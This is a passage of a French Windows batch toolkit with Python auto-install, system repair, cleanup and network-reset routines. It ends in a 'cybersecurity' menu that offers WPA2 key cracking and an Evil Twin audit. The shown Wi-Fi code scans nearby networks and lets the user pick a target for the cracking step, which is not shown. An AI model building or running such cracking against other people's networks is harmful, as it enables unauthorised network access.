        if !errorlevel! neq 0 (
            "%%p" --version >nul 2>&1
            if !errorlevel! equ 0 set "PYCMD=%%p"
        )
    )
)
if defined PYCMD goto :eof

REM 3. Tester 'where py'
for /f "delims=" %%p in ('where py 2^>nul') do (
    if not defined PYCMD (
        "%%p" --version >nul 2>&1
        if !errorlevel! equ 0 set "PYCMD=%%p"
    )
)
if defined PYCMD goto :eof

REM 4. Chercher dans les dossiers d'installation standards (AppData / ProgramFiles)
for /d %%D in ("%LOCALAPPDATA%\Programs\Python\Python*") do (
    if not defined PYCMD if exist "%%~D\python.exe" (
        "%%~D\python.exe" --version >nul 2>&1
        if !errorlevel! equ 0 set "PYCMD=%%~D\python.exe"
    )
)
if defined PYCMD goto :eof

for /d %%D in ("%ProgramFiles%\Python*") do (
    if not defined PYCMD if exist "%%~D\python.exe" (
        "%%~D\python.exe" --version >nul 2>&1
        if !errorlevel! equ 0 set "PYCMD=%%~D\python.exe"
    )
)
if defined PYCMD goto :eof

REM 5. Si introuvable, tentative d'installation automatique
echo.
echo  [!] Python introuvable - Installation automatique via winget...
echo.
winget install --id Python.Python.3.12 --accept-package-agreements --accept-source-agreements -e >nul 2>&1
if !errorlevel! equ 0 goto py_verify_install

call :py_download_install

:py_verify_install
py --version >nul 2>&1
if !errorlevel! equ 0 (
    set "PYCMD=py"
    goto :eof
)
for /d %%D in ("%LOCALAPPDATA%\Programs\Python\Python*") do (
    if not defined PYCMD if exist "%%~D\python.exe" (
        "%%~D\python.exe" --version >nul 2>&1
        if !errorlevel! equ 0 set "PYCMD=%%~D\python.exe"
    )
)
if not defined PYCMD (
    for /f "delims=" %%p in ('where python 2^>nul') do (
        if not defined PYCMD (
            echo %%p | findstr /i "WindowsApps" >nul
            if !errorlevel! neq 0 (
                "%%p" --version >nul 2>&1
                if !errorlevel! equ 0 set "PYCMD=%%p"
            )
        )
    )
)
if not defined PYCMD set "PYERR=1"
goto :eof

:py_download_install
echo  [!] winget indisponible - tentative via Python.org...
set "PY_PS=%TEMP%\py_inst_%RANDOM%.ps1"
> "%PY_PS%" echo $ProgressPreference='SilentlyContinue'
>> "%PY_PS%" echo try {
>> "%PY_PS%" echo     $api = Invoke-RestMethod 'https://endoflife.date/api/python.json' -EA Stop
>> "%PY_PS%" echo     $ver = ($api ^| Where-Object { -not $_.eol } ^| Select-Object -First 1).latest
>> "%PY_PS%" echo } catch { $ver = '3.12.10' }
>> "%PY_PS%" echo if (-not $ver) { $ver = '3.12.10' }
>> "%PY_PS%" echo $url = "https://www.python.org/ftp/python/$ver/python-$ver-amd64.exe"
>> "%PY_PS%" echo Write-Host "  [~] Telechargement Python $ver..." -ForegroundColor Cyan
>> "%PY_PS%" echo $inst = "$env:TEMP\py_setup.exe"
>> "%PY_PS%" echo Invoke-WebRequest $url -OutFile $inst
>> "%PY_PS%" echo Write-Host '  [~] Installation silencieuse...' -ForegroundColor Cyan
>> "%PY_PS%" echo Start-Process $inst -ArgumentList '/quiet InstallAllUsers=0 PrependPath=1 Include_test=0' -Wait
>> "%PY_PS%" echo Remove-Item $inst -Force -EA SilentlyContinue
>> "%PY_PS%" echo Write-Host '  [OK] Python installe.' -ForegroundColor Green
powershell -NoProfile -ExecutionPolicy Bypass -File "%PY_PS%"
del /f /q "%PY_PS%" 2>nul
goto :eof

:sys_rescue_menu
call :AutoMenu "OUTIL DE REPARATION WINDOWS (Rescue)" "res_restore_point;res_sfc;res_dism_check;res_dism_restore;res_chkdsk;res_wu_reset;res_gpedit"
if "%errorlevel%"=="0" goto system_tools
goto !AutoMenu_Target!

:res_sfc
cls
echo [OPERATION] SFC Scannow en cours (Cela peut prendre plusieurs minutes)...
sfc /scannow
pause
goto sys_rescue_menu

:res_dism_check
cls
echo [OPERATION] DISM /CheckHealth puis ScanHealth...
DISM /Online /Cleanup-Image /CheckHealth
DISM /Online /Cleanup-Image /ScanHealth
pause
goto sys_rescue_menu

:res_dism_restore
cls
echo [OPERATION] DISM /RestoreHealth (Restauration systeme)...
DISM /Online /Cleanup-Image /RestoreHealth
pause
goto sys_rescue_menu

:res_temp_clean
cls
echo [OPERATION] Purge absolue des fichiers inutiles...
echo Suppression de %TEMP%...
del /q /f /s "%TEMP%\*" >nul 2>&1
echo Suppression de C:\Windows\Temp...
del /q /f /s "C:\Windows\Temp\*" >nul 2>&1
echo Suppression du cache Windows Update (SoftwareDistribution\Download)...
net stop wuauserv >nul 2>&1
del /q /f /s "C:\Windows\SoftwareDistribution\Download\*" >nul 2>&1
net start wuauserv >nul 2>&1
echo Nettoyage termine ! De l'espace a ete libere.
pause
goto sys_rescue_menu

:res_chkdsk
cls
echo  CHKDSK va scanner tous les volumes detectes.
echo  Le disque systeme (C:) sera planifie au prochain demarrage.
echo.
> "%TEMP%\yn_confirm.ps1" echo $sel = 1
>> "%TEMP%\yn_confirm.ps1" echo function Show-Choice {
>> "%TEMP%\yn_confirm.ps1" echo     param($s)
>> "%TEMP%\yn_confirm.ps1" echo     $c = $host.UI.RawUI.CursorPosition; $c.X = 0; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo     Write-Host "  Lancer CHKDSK sur tous les disques ?  " -NoNewline
>> "%TEMP%\yn_confirm.ps1" echo     if ($s -eq 0) { Write-Host " OUI " -NoNewline -ForegroundColor Black -BackgroundColor Green; Write-Host "   NON  " -ForegroundColor DarkGray }
>> "%TEMP%\yn_confirm.ps1" echo     else          { Write-Host " OUI " -NoNewline -ForegroundColor DarkGray;                    Write-Host "   NON  " -ForegroundColor Black -BackgroundColor Red }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo while ($true) {
>> "%TEMP%\yn_confirm.ps1" echo     $k = [Console]::ReadKey($true)
>> "%TEMP%\yn_confirm.ps1" echo     if ($k.Key -eq 'LeftArrow' -or $k.Key -eq 'RightArrow') {
>> "%TEMP%\yn_confirm.ps1" echo         $sel = 1 - $sel
>> "%TEMP%\yn_confirm.ps1" echo         $c = $host.UI.RawUI.CursorPosition; $c.Y--; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo         Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo     } elseif ($k.Key -eq 'Enter') { break }
>> "%TEMP%\yn_confirm.ps1" echo     elseif ($k.Key -eq 'Escape') { $sel = 1; break }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Write-Host ""
>> "%TEMP%\yn_confirm.ps1" echo exit $sel
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\yn_confirm.ps1"
set "_YN=%errorlevel%"
del /f /q "%TEMP%\yn_confirm.ps1" 2>nul
if "%_YN%"=="1" goto sys_rescue_menu
> "%TEMP%\chkdsk_all.ps1" echo [Console]::OutputEncoding = [System.Text.UTF8Encoding]::new($false)
>> "%TEMP%\chkdsk_all.ps1" echo $sys = ($env:SystemDrive -replace ':','').ToUpper()
>> "%TEMP%\chkdsk_all.ps1" echo $drives = Get-PSDrive -PSProvider FileSystem -EA SilentlyContinue ^| Where-Object { $null -ne $_.Free } ^| Select-Object -ExpandProperty Name -Unique ^| Sort-Object
>> "%TEMP%\chkdsk_all.ps1" echo $ok = 0; $warn = 0
>> "%TEMP%\chkdsk_all.ps1" echo foreach ($d in $drives) {
>> "%TEMP%\chkdsk_all.ps1" echo     $letter = ([string]$d).TrimEnd(':').ToUpper()
>> "%TEMP%\chkdsk_all.ps1" echo     $target = "$letter`:"
>> "%TEMP%\chkdsk_all.ps1" echo     Write-Host "`n[$target] CHKDSK en cours..." -ForegroundColor Cyan
>> "%TEMP%\chkdsk_all.ps1" echo     if ($letter -eq $sys) {
>> "%TEMP%\chkdsk_all.ps1" echo         Write-Host "[$target] Disque systeme : planification au prochain redemarrage." -ForegroundColor Yellow
>> "%TEMP%\chkdsk_all.ps1" echo         $out = cmd.exe /c "echo Y|chkdsk $target /f /r" 2^>^&1
>> "%TEMP%\chkdsk_all.ps1" echo     } else {
>> "%TEMP%\chkdsk_all.ps1" echo         $out = cmd.exe /c "chkdsk $target /f /r /x" 2^>^&1
>> "%TEMP%\chkdsk_all.ps1" echo     }
>> "%TEMP%\chkdsk_all.ps1" echo     $out ^| ForEach-Object { if ($_) { Write-Host $_ } }
>> "%TEMP%\chkdsk_all.ps1" echo     if ($LASTEXITCODE -eq 0) { Write-Host "[$target] Termine (OK)" -ForegroundColor Green; $ok++ }
>> "%TEMP%\chkdsk_all.ps1" echo     else { Write-Host "[$target] Code de sortie : $LASTEXITCODE" -ForegroundColor Yellow; $warn++ }
>> "%TEMP%\chkdsk_all.ps1" echo }
>> "%TEMP%\chkdsk_all.ps1" echo Write-Host "`n  Resume : OK=$ok  Avertissements=$warn" -ForegroundColor White
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\chkdsk_all.ps1"
del /f /q "%TEMP%\chkdsk_all.ps1" 2>nul
pause
goto sys_rescue_menu

:res_wu_reset
cls
echo [OPERATION] Reinitialisation de Windows Update avec sauvegarde...
echo.
net stop bits >nul 2>&1
net stop wuauserv >nul 2>&1
net stop appidsvc >nul 2>&1
net stop cryptsvc >nul 2>&1
net stop msiserver >nul 2>&1
> "%TEMP%\wu_reset.ps1" echo $rnd = Get-Random
>> "%TEMP%\wu_reset.ps1" echo $sd = "$env:windir\SoftwareDistribution"
>> "%TEMP%\wu_reset.ps1" echo $cr = "$env:windir\System32\catroot2"
>> "%TEMP%\wu_reset.ps1" echo if (Test-Path $sd) {
>> "%TEMP%\wu_reset.ps1" echo     Rename-Item $sd "$sd.bak_$rnd" -ErrorAction SilentlyContinue
>> "%TEMP%\wu_reset.ps1" echo     Write-Host "[OK] SoftwareDistribution -> SoftwareDistribution.bak_$rnd" -ForegroundColor Green
>> "%TEMP%\wu_reset.ps1" echo } else { Write-Host "[--] SoftwareDistribution absent, rien a sauvegarder." }
>> "%TEMP%\wu_reset.ps1" echo if (Test-Path $cr) {
>> "%TEMP%\wu_reset.ps1" echo     Rename-Item $cr "$cr.bak_$rnd" -ErrorAction SilentlyContinue
>> "%TEMP%\wu_reset.ps1" echo     Write-Host "[OK] catroot2 -> catroot2.bak_$rnd" -ForegroundColor Green
>> "%TEMP%\wu_reset.ps1" echo } else { Write-Host "[--] catroot2 absent, rien a sauvegarder." }
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\wu_reset.ps1"
del /f /q "%TEMP%\wu_reset.ps1" 2>nul
netsh winsock reset >nul 2>&1
net start bits >nul 2>&1
net start wuauserv >nul 2>&1
net start appidsvc >nul 2>&1
net start cryptsvc >nul 2>&1
net start msiserver >nul 2>&1
echo.
echo [OK] Windows Update reinitialise. Les anciens dossiers sont renommes (rollback possible).
pause
goto sys_rescue_menu

:res_explorer_restart
cls
echo.
echo  [EXPLORER] Redemarrage de l'Explorateur Windows...
echo  L'ecran va clignoter brievement, c'est normal.
echo.
taskkill /f /im explorer.exe >nul 2>&1
timeout /t 2 /nobreak >nul
start explorer.exe
echo  [OK] Explorateur Windows redemarre avec succes !
timeout /t 2 /nobreak >nul
goto sys_winre

:res_gpu_reset
cls
echo.
echo  [GPU] Reinitialisation du pilote graphique en cours...
echo  L'ecran va peut-etre clignoter brievement (c'est normal).
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$c='[DllImport(\"user32.dll\")]public static extern void keybd_event(byte b,byte s,uint f,uint e);';$t=Add-Type -MemberDefinition $c -Name 'K' -PassThru;$t::keybd_event(0x5B,0,0,0);$t::keybd_event(0x11,0,0,0);$t::keybd_event(0x10,0,0,0);$t::keybd_event(0x42,0,0,0);$t::keybd_event(0x42,0,2,0);$t::keybd_event(0x10,0,2,0);$t::keybd_event(0x11,0,2,0);$t::keybd_event(0x5B,0,2,0)"
timeout /t 2 /nobreak >nul
echo  [OK] Signal de reinitialisation GPU envoye !
echo  Si l'ecran n'a pas clignote, verifiez que votre GPU supporte
echo  le raccourci Win+Ctrl+Shift+B (pilotes recents requis).
echo.
pause
goto sys_winre

:res_gpedit
cls
echo [OPERATION] Installation de gpedit.msc (Editeur de Strategie de Groupe)...
echo  Recherche des packages dans %SystemRoot%\servicing\Packages...
echo.
> "%TEMP%\gpedit_install.ps1" echo $pkg = "$env:SystemRoot\servicing\Packages"
>> "%TEMP%\gpedit_install.ps1" echo if (-not (Test-Path $pkg)) { Write-Host "[ERREUR] Dossier introuvable: $pkg" -ForegroundColor Red; exit 1 }
>> "%TEMP%\gpedit_install.ps1" echo $tools = Get-ChildItem $pkg -Filter "Microsoft-Windows-GroupPolicy-ClientTools-Package~*.mum" -EA SilentlyContinue
>> "%TEMP%\gpedit_install.ps1" echo $ext   = Get-ChildItem $pkg -Filter "Microsoft-Windows-GroupPolicy-ClientExtensions-Package~*.mum" -EA SilentlyContinue
>> "%TEMP%\gpedit_install.ps1" echo if (-not $tools -or -not $ext) {
>> "%TEMP%\gpedit_install.ps1" echo     Write-Host "[ERREUR] Packages GroupPolicy introuvables." -ForegroundColor Red
>> "%TEMP%\gpedit_install.ps1" echo     Write-Host "         Windows Home incompatible ou version non supportee." -ForegroundColor Yellow
>> "%TEMP%\gpedit_install.ps1" echo     exit 1
>> "%TEMP%\gpedit_install.ps1" echo }
>> "%TEMP%\gpedit_install.ps1" echo $all = @($tools + $ext) ^| Sort-Object Name -Unique
>> "%TEMP%\gpedit_install.ps1" echo foreach ($p in $all) {
>> "%TEMP%\gpedit_install.ps1" echo     Write-Host "  Installation: $($p.Name)..." -NoNewline
>> "%TEMP%\gpedit_install.ps1" echo     $r = Start-Process dism.exe -ArgumentList "/online","/norestart","/add-package:`"$($p.FullName)`"" -NoNewWindow -Wait -PassThru
>> "%TEMP%\gpedit_install.ps1" echo     if ($r.ExitCode -eq 0) { Write-Host " [OK]" -ForegroundColor Green }
>> "%TEMP%\gpedit_install.ps1" echo     else { Write-Host " [ECHEC code $($r.ExitCode)]" -ForegroundColor Red }
>> "%TEMP%\gpedit_install.ps1" echo }
>> "%TEMP%\gpedit_install.ps1" echo Write-Host "`n[OK] Termine. Lancez 'gpedit.msc' (un redemarrage peut etre necessaire)." -ForegroundColor Green
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\gpedit_install.ps1"
del /f /q "%TEMP%\gpedit_install.ps1" 2>nul
pause
goto sys_rescue_menu

:res_clean_browsers
cls
echo [OPERATION] Nettoyage des caches navigateurs et fichiers temporaires...
echo.
> "%TEMP%\clean_browsers.ps1" echo $total = 0
>> "%TEMP%\clean_browsers.ps1" echo function Clean-Dir {
>> "%TEMP%\clean_browsers.ps1" echo     param($path, $pattern = "*")
>> "%TEMP%\clean_browsers.ps1" echo     if (-not (Test-Path $path)) { return 0 }
>> "%TEMP%\clean_browsers.ps1" echo     $size = 0
>> "%TEMP%\clean_browsers.ps1" echo     try { $files = [System.IO.Directory]::EnumerateFiles($path, $pattern, [System.IO.SearchOption]::AllDirectories) }
>> "%TEMP%\clean_browsers.ps1" echo     catch { return 0 }
>> "%TEMP%\clean_browsers.ps1" echo     foreach ($f in $files) {
>> "%TEMP%\clean_browsers.ps1" echo         try { $fi = [System.IO.FileInfo]::new($f); $size += $fi.Length; $fi.Delete() } catch {}
>> "%TEMP%\clean_browsers.ps1" echo     }
>> "%TEMP%\clean_browsers.ps1" echo     return $size
>> "%TEMP%\clean_browsers.ps1" echo }
>> "%TEMP%\clean_browsers.ps1" echo function Show-Result { param($name, $bytes) $mb = [math]::Round($bytes/1MB,2); Write-Host ("  {0,-30} {1,8} MB liberes" -f $name, $mb) -ForegroundColor Cyan }
>> "%TEMP%\clean_browsers.ps1" echo $items = @(
>> "%TEMP%\clean_browsers.ps1" echo     @{n="Edge";             p="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache\Cache_Data"},
>> "%TEMP%\clean_browsers.ps1" echo     @{n="Chrome";           p="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache\Cache_Data"},
>> "%TEMP%\clean_browsers.ps1" echo     @{n="Brave";            p="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cache\Cache_Data"},
>> "%TEMP%\clean_browsers.ps1" echo     @{n="Opera";            p="$env:APPDATA\Opera Software\Opera Stable\Cache"},
>> "%TEMP%\clean_browsers.ps1" echo     @{n="Temp utilisateur"; p="$env:TEMP"},
>> "%TEMP%\clean_browsers.ps1" echo     @{n="Temp systeme";     p="$env:SystemRoot\Temp"},
>> "%TEMP%\clean_browsers.ps1" echo     @{n="Miniatures";       p="$env:LOCALAPPDATA\Microsoft\Windows\Explorer"; pat="thumbcache_*.db"},
>> "%TEMP%\clean_browsers.ps1" echo     @{n="Recent";           p="$env:APPDATA\Microsoft\Windows\Recent"},
>> "%TEMP%\clean_browsers.ps1" echo     @{n="WER (Rapports)";   p="$env:ProgramData\Microsoft\Windows\WER"}
>> "%TEMP%\clean_browsers.ps1" echo )
>> "%TEMP%\clean_browsers.ps1" echo foreach ($e in $items) {
>> "%TEMP%\clean_browsers.ps1" echo     $pat = if ($e.pat) { $e.pat } else { "*" }
>> "%TEMP%\clean_browsers.ps1" echo     $b = Clean-Dir $e.p $pat; $total += $b; Show-Result $e.n $b
>> "%TEMP%\clean_browsers.ps1" echo }
>> "%TEMP%\clean_browsers.ps1" echo $ffRoot = "$env:APPDATA\Mozilla\Firefox\Profiles"
>> "%TEMP%\clean_browsers.ps1" echo if (Test-Path $ffRoot) {
>> "%TEMP%\clean_browsers.ps1" echo     $b = 0
>> "%TEMP%\clean_browsers.ps1" echo     Get-ChildItem $ffRoot -Directory -EA SilentlyContinue ^| ForEach-Object { $b += Clean-Dir "$($_.FullName)\cache2\entries" }
>> "%TEMP%\clean_browsers.ps1" echo     $total += $b; Show-Result "Firefox" $b
>> "%TEMP%\clean_browsers.ps1" echo }
>> "%TEMP%\clean_browsers.ps1" echo Write-Host ("`n  TOTAL libere : {0:N2} MB" -f ($total/1MB)) -ForegroundColor Green
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\clean_browsers.ps1"
del /f /q "%TEMP%\clean_browsers.ps1" 2>nul
pause
goto sys_opti_menu

:sys_network_menu
call :AutoMenu "MENU DE DEPANNAGE RESEAU" "net_flush_dns;net_display_dns;net_clear_arp;net_display_arp;net_renew_ip;net_reset_tcpip;net_reset_winsock;net_reset_all;net_restart_adapters;net_fast_reset"
if "%errorlevel%"=="0" goto system_tools
goto !AutoMenu_Target!

:net_flush_dns
cls
echo Vidage du cache DNS...
ipconfig /flushdns
pause
goto sys_network_menu

:net_display_dns
cls
echo Affichage du cache DNS...
ipconfig /displaydns | more
pause
goto sys_network_menu

:net_clear_arp
cls
echo Nettoyage du cache ARP...
arp -d *
echo Cache ARP vide !
pause
goto sys_network_menu

:net_display_arp
cls
echo Affichage de la table ARP...
arp -a
pause
goto sys_network_menu

:net_renew_ip
cls
echo Liberation de l'IP...
ipconfig /release
echo Renouvellement de l'IP...
ipconfig /renew
pause
goto sys_network_menu

:net_reset_tcpip
cls
echo Reset de la pile TCP/IP...
netsh int ip reset >nul
netsh int ipv6 reset >nul
echo Pile TCP/IP reinitialisee. (Un redemarrage peut etre necessaire)
pause
goto sys_network_menu

:net_reset_winsock
cls
echo Reset du catalogue Winsock...
netsh winsock reset >nul
echo Winsock reinitialise. (Un redemarrage est necessaire)
pause
goto sys_network_menu

:net_reset_all
cls
echo ==== LANCEMENT DU RESET COMPLET ====
ipconfig /flushdns >nul
netsh winsock reset >nul
netsh int ip reset >nul
netsh int ipv6 reset >nul
arp -d * >nul 2>&1
echo.
echo Reset complet effectue ! Veuillez redemarrer votre ordinateur.
pause
goto sys_network_menu

:net_restart_adapters
cls
echo Redemarrage des interfaces reseau...
netsh interface set interface "Wi-Fi" admin=disable 2>nul
netsh interface set interface "Wi-Fi" admin=enable 2>nul
netsh interface set interface "Ethernet" admin=disable 2>nul
netsh interface set interface "Ethernet" admin=enable 2>nul
echo Interfaces redemarrees silencieusement.
pause
goto sys_network_menu

:net_fast_reset
cls
echo =========================================
echo       Script Rapide de Reparation
echo =========================================
echo.
echo [*] Liberation de l'adresse IP actuelle (release)...
ipconfig /release >nul
echo [*] Vidage du cache ARP...
arp -d * >nul 2>&1
echo [*] Vidage du cache NetBIOS (R)...
nbtstat -R >nul
echo [*] Renouvellement du bail DHCP (renew)...
ipconfig /renew >nul
echo [*] Vidage du cache DNS...
ipconfig /flushdns >nul
echo [*] Re-enregistrement avec WINS...
nbtstat -RR >nul
echo [*] Re-enregistrement avec DNS...
ipconfig /registerdns >nul
echo.
echo Reinitialisation reseau terminee avec succes !
pause
goto sys_network_menu

REM ===================================================================
REM              MENU CYBERSECURITE RESEAU - PAR ALEEXLEDEV
REM ===================================================================
:net_cyber_menu
call :AutoMenu "CYBERSECURITE RESEAU" "net_menu_wifi;net_menu_interne;net_menu_distant"
if "%errorlevel%"=="0" goto system_tools
goto !AutoMenu_Target!

:net_menu_wifi
set "wifi_opts=Crack Reseau Wi-Fi~Scan, analyse et crack de la cle WPA2;[---];Audit Evil Twin~Detection de faux points d'acces;Retour"
call :DynamicMenu "WI-FI - HORS CONNEXION" "!wifi_opts!" "NONUMS"
set "wifi_ch=%errorlevel%"
if "!wifi_ch!"=="0" goto net_cyber_menu
if "!wifi_ch!"=="1" (set "wifi_pipeline=1" & goto net_wifi_scan)
if "!wifi_ch!"=="2" goto cyber_wifi_audit
if "!wifi_ch!"=="3" goto net_cyber_menu
goto net_menu_wifi

rem ============================================================
rem  WIFI TOOLS
rem ============================================================
:net_wifi_scan
setlocal enabledelayedexpansion
cls
set "WIFI_SCAN=%TEMP%\wifi_scan_%RANDOM%.txt"
set "NWS=%TEMP%\net_wifiscan_%RANDOM%.ps1"
echo.
echo %B%  ================================================%N%
echo %B%   SCAN RESEAUX WI-FI ENVIRONNANTS%N%
echo %B%  ================================================%N%
echo.
echo  %C%[i] Scan en cours...%N%
echo.
>  "%NWS%" echo Write-Host "  [>] Scan radio actif (WlanScan API)..." -f DarkGray
>> "%NWS%" echo $cs='using System;using System.Runtime.InteropServices;public class WD{[DllImport("wlanapi.dll")]public static extern uint WlanOpenHandle(uint v,IntPtr r,out uint n,out IntPtr h);[DllImport("wlanapi.dll")]public static extern uint WlanCloseHandle(IntPtr h,IntPtr r);[DllImport("wlanapi.dll")]public static extern uint WlanEnumInterfaces(IntPtr h,IntPtr r,out IntPtr l);[DllImport("wlanapi.dll")]public static extern uint WlanScan(IntPtr h,ref Guid g,IntPtr s,IntPtr d,IntPtr r);[DllImport("wlanapi.dll")]public static extern void WlanFreeMemory(IntPtr p);}'
>> "%NWS%" echo try{Add-Type -TypeDefinition $cs -EA Stop}catch{}
>> "%NWS%" echo $wh=[IntPtr]::Zero;$wn=[uint32]0
>> "%NWS%" echo if([WD]::WlanOpenHandle(2,[IntPtr]::Zero,[ref]$wn,[ref]$wh) -eq 0){
>> "%NWS%" echo     $wl=[IntPtr]::Zero
>> "%NWS%" echo     if([WD]::WlanEnumInterfaces($wh,[IntPtr]::Zero,[ref]$wl) -eq 0){
>> "%NWS%" echo         $wc=[Runtime.InteropServices.Marshal]::ReadInt32($wl,0)
>> "%NWS%" echo         for($wi=0;$wi -lt $wc;$wi++){
>> "%NWS%" echo             $wg=[Runtime.InteropServices.Marshal]::PtrToStructure([IntPtr]([long]$wl+8+532*$wi),[type][Guid])
>> "%NWS%" echo             [WD]::WlanScan($wh,[ref]$wg,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero) ^| Out-Null
>> "%NWS%" echo         }
>> "%NWS%" echo         [WD]::WlanFreeMemory($wl)
>> "%NWS%" echo     }
>> "%NWS%" echo     Start-Sleep -Seconds 3
>> "%NWS%" echo     [WD]::WlanCloseHandle($wh,[IntPtr]::Zero) ^| Out-Null
>> "%NWS%" echo }
>> "%NWS%" echo Write-Host "`r  [>] Lecture des reseaux visibles...   " -f DarkGray
>> "%NWS%" echo function Parse-Nets($lines){
>> "%NWS%" echo     $r=@();$c=@{}
>> "%NWS%" echo     foreach($l in $lines){
>> "%NWS%" echo         if($l -match '^\s*SSID\s+\d+\s*:\s*(.+)$' -and $l -notmatch 'BSSID'){
>> "%NWS%" echo             if($c.Count){$r+=$c}
>> "%NWS%" echo             $c=@{SSID=$matches[1].Trim();BSSID='';Signal='';Auth='';Cipher='';Channel=''}
>> "%NWS%" echo         } elseif($l -match 'BSSID\s+\d+\s*:\s*(.+)'){$c.BSSID=$matches[1].Trim()}
>> "%NWS%" echo         elseif(-not $c.Signal -and $l -match 'Signal\s*:\s*(.+)'){$c.Signal=$matches[1].Trim()}
>> "%NWS%" echo         elseif(-not $c.Auth -and $l -match '\b(?:authentication^|authentification)\s*:\s*(.+)'){$c.Auth=$matches[1].Trim()}
>> "%NWS%" echo         elseif($l -match '\bchiffrement\s*:\s*(.+)'){$c.Cipher=$matches[1].Trim()}
>> "%NWS%" echo         elseif($l -match '^\s+Canal\s*:\s*(\d+)'){$c.Channel=$matches[1].Trim()}
>> "%NWS%" echo     }
>> "%NWS%" echo     if($c.Count){$r+=$c};return $r
>> "%NWS%" echo }
>> "%NWS%" echo $nets=@(Parse-Nets(netsh wlan show networks mode=bssid 2^>$null))
>> "%NWS%" echo $knownSSIDs=@($nets ^| ForEach-Object {$_.SSID})
>> "%NWS%" echo $extra=@(Parse-Nets(netsh wlan show networks 2^>$null) ^| Where-Object {$knownSSIDs -notcontains $_.SSID})
>> "%NWS%" echo $nets=@($nets+$extra ^| Where-Object {$_.SSID -and $_.SSID -notmatch '^DIRECT-'})
>> "%NWS%" echo if($nets.Count){}
>> "%NWS%" echo $nets=@($nets ^| Sort-Object -Property @{Expression={try{[int]($_.Signal.Replace([string][char]37,''))}catch{0}}; Descending=$true} ^| Select-Object -First 12)
>> "%NWS%" echo Write-Host ("  "+("SSID").PadRight(40)+" "+("Signal").PadRight(8)+" Auth") -f Cyan
>> "%NWS%" echo Write-Host ("  "+("-"*40)+" "+("-"*8)+" "+"-"*12) -f DarkGray
>> "%NWS%" echo $out=@()
>> "%NWS%" echo foreach($n in $nets){
>> "%NWS%" echo     $auth=$n.Auth -replace 'WPA2[\s-]+Perso\w+','WPA2' -replace 'WPA[\s-]+Perso\w+','WPA' -replace 'Ouvert','Open' -replace 'Open System','Open'
>> "%NWS%" echo     $col=if($auth -match 'WPA2'){'Green'}elseif($auth -match 'WPA'){'Yellow'}elseif($auth -match 'WEP'){'Red'}else{'DarkGray'}
>> "%NWS%" echo     $badChars = [char]34, [char]38, [char]60, [char]62, [char]124, [char]59
>> "%NWS%" echo     $safeSSID = $n.SSID; foreach($c in $badChars){ $safeSSID = $safeSSID.Replace([string]$c, '') }
>> "%NWS%" echo     $safeSignal=$n.Signal.Replace([string][char]37, '')
>> "%NWS%" echo     Write-Host ("  "+$safeSSID.PadRight(40)+" "+$n.Signal.PadRight(8)+" "+$auth) -f $col
>> "%NWS%" echo     $out+=($safeSSID+";"+$safeSignal+";"+$auth)
>> "%NWS%" echo }
>> "%NWS%" echo $out ^| Set-Content '%WIFI_SCAN%' -Encoding ASCII
>> "%NWS%" echo Write-Host ""
>> "%NWS%" echo Write-Host ("  [i] "+$nets.Count+" reseau(x) detecte(s). Fichier: %WIFI_SCAN%") -f DarkGray
powershell -NoProfile -ExecutionPolicy Bypass -File "%NWS%"
set "ps_exit=%errorlevel%"
if exist "%NWS%" del /f /q "%NWS%"
echo.
if not "%ps_exit%"=="0" goto wifi_scan_ps_error
goto wifi_scan_selection
:wifi_scan_ps_error
echo  %R%ERREUR : Le scan Wi-Fi a echoue (code %ps_exit%).%N%
echo  %Y%Verifiez que votre adaptateur Wi-Fi est active et visible.%N%
echo.
pause
endlocal
goto net_menu_wifi
:wifi_scan_selection
set /a wifi_count=0
for /f "usebackq tokens=1-3 delims=;" %%A in ("%WIFI_SCAN%") do (
    set /a wifi_count+=1
)
if %wifi_count%==0 (
    echo  %R%Aucun reseau Wi-Fi detecte dans les environs.%N%
    echo  %Y%Assurez-vous que le Wi-Fi est active et qu'il y a des reseaux proches.%N%
    echo.
    pause
    endlocal
    goto net_menu_wifi
)
set "wifi_sel_opts="
for /f "usebackq tokens=1-3 delims=;" %%A in ("%WIFI_SCAN%") do (
    if "!wifi_sel_opts!"=="" (set "wifi_sel_opts=%%A~%%B  %%C") else (set "wifi_sel_opts=!wifi_sel_opts!;%%A~%%B  %%C")
)
set "wifi_sel_opts=!wifi_sel_opts!;[---];Rescan~Relancer le scan Wi-Fi;Retour"
call :DynamicMenu "CHOISIR LE RESEAU CIBLE" "!wifi_sel_opts!" "NONUMS NOCLS"
set "wifi_sel=%errorlevel%"
if "!wifi_sel!"=="0" goto wifi_scan_retour
set /a wifi_rescan_idx=wifi_count+1
set /a wifi_retour_idx=wifi_count+2
if "!wifi_sel!"=="!wifi_rescan_idx!" goto wifi_scan_rescan
if "!wifi_sel!"=="!wifi_retour_idx!" goto wifi_scan_retour
set "wt_ssid=" & set "wt_signal=" & set "wt_auth="
set /a wifi_sel_line=0
for /f "usebackq tokens=1-3 delims=;" %%A in ("%WIFI_SCAN%") do (
    set /a wifi_sel_line+=1
    if "!wifi_sel_line!"=="!wifi_sel!" (
        set "wt_ssid=%%A" & set "wt_signal=%%B" & set "wt_auth=%%C"
    )
)
if "!wt_ssid!"=="" goto wifi_scan_retour
endlocal & set "WIFI_SCAN_FILE=%WIFI_SCAN%" & set "WIFI_TARGET_SSID=%wt_ssid%"
goto net_wifi_crack
:wifi_scan_rescan
if exist "%WIFI_SCAN%" del /f /q "%WIFI_SCAN%"
endlocal
goto net_wifi_scan
:wifi_scan_retour
